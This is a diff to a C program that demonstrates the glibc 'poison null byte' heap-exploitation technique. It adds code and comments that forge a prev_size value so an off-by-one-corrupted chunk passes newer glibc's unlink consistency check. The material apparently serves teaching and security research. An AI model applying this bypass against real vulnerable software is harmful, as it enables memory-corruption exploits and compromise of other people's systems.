@@ -9,6 +9,7 @@ int main()
 {
 	fprintf(stderr, "Welcome to poison null byte 2.0!\n");
 	fprintf(stderr, "Tested in Ubuntu 14.04 64bit.\n");
+	fprintf(stderr, "This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
 	fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
 	uint8_t* a;
@@ -42,6 +43,16 @@ int main()
 
 	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
 
+	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
+	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
+	// this added check requires we are allowed to have null pointers in b (not just a c string)
+	//*(size_t*)(b+0x1f0) = 0x200;
+	fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "
+		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
+	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
+	// which is the value of b.size after its first byte has been overwritten with a NULL byte
+	*(size_t*)(b+0x1f0) = 0x200;
+
 	// this technique works by overwriting the size metadata of a free chunk
 	free(b);
 	
@@ -54,6 +65,15 @@ int main()
 	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
 	fprintf(stderr, "c.prev_size is %#lx\n",*c_prev_size_ptr);
 
+	// This malloc will result in a call to unlink on the chunk where b was.
+	// The added check (commit id: 17f487b), if not properly handled as we did before,
+	// will detect the heap corruption now.
+	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
+	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
+	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
+	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
+	fprintf(stderr, "We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
+		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
 	b1 = malloc(0x100);
 
 	fprintf(stderr, "b1: %p\n",b1);
@@ -84,6 +104,6 @@ int main()
 
 	fprintf(stderr, "New b2 content:\n%s\n",b2);
 
-	fprintf(stderr, "Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf "
+	fprintf(stderr, "Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
 		"for the clear explanation of this technique.\n");
 }
